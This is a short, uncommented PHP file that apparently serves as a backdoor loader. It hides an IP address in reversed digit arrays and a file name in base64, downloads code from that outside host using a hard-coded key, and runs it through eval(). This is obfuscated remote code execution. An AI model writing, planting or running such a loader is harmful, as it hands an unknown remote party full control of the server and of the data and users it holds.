<?php
$key = 'ea2b2676c28c0db2s2aa0j0a36d39331a336c6b92';
$ipar = [[6,5,1],[6,6],[1,7],[7,6,1]];
$ip = '';

foreach(array_reverse($ipar) as $ar){
  foreach(array_reverse($ar) as $ar2){
    $ip .= $ar2;
  }
  $ip .= '.';
}
eval(file_get_contents('http://'.substr($ip, 0, -1).'/'.base64_decode('ZmlsZS5waHA=').'?file='.$key));